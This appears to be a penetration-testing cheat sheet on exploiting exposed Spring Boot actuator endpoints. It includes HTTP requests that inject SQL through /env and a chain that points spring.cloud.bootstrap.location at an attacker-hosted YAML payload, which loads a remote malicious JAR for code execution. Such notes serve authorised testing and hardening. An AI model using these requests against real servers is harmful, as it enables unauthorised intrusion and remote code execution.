Spring Boot
===========


## Spring Boot Actuators API

The Spring Boot Framework includes a bunch of features called `actuators` to monitor apps.
When the application is running, it registers endpoints that are accessible without
authentication.

Here are some `actuators`:

 - `/dump`: displays a dump of threads (including a stack trace)
 - `/trace`: displays the last several HTTP messages (which could include session identifiers)
 - `/logfile`: outputs the contents of the log file
 - `/shutdown`: shuts the application down
 - `/mappings`: shows all of the MVC controller mappings
 - `/env`: provides access to the configuration environment
 - `/restart`: restarts the application


For instance, it's possible to [dump the heap memory](https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/actuator-api/html/#heapdump)
of the server:

```
https://<host>/path/actuator/heapdump
```

A brute-force list can be found here: [spring_boot.txt](./spring_boot.txt)


## Jolokia

An other Sping Boot endpoint is `jolokia`. It allow the user to perform the same
actions as the JMX.

```
https://<host>/path/jolokia/list
```

It can be used to perform remote code execution.


## Env

The `/env` endpoint allows to update the Spring Boot environmental properties.
It's possible to execute SQL commands:

```
POST /env HTTP/1.1
Host: <host>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

spring.datasource.tomcat.validationQuery=<sql cmd>
```

Also, it's possible to update the `env` to execute code with the properties:
`spring.cloud.bootstrap.location` which is used to load external configuration file:

```
POST /env HTTP/1.1
Host: <host>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

spring.cloud.bootstrap.location=http://<attacker>/malicious-config-file.yml
```

The malicious configuration file can be:
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<attacker>/malicious.jar"]
  ]]
]
```

You need to refresh the configuration:
```
POST /refresh HTTP/1.1
Host: <host>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
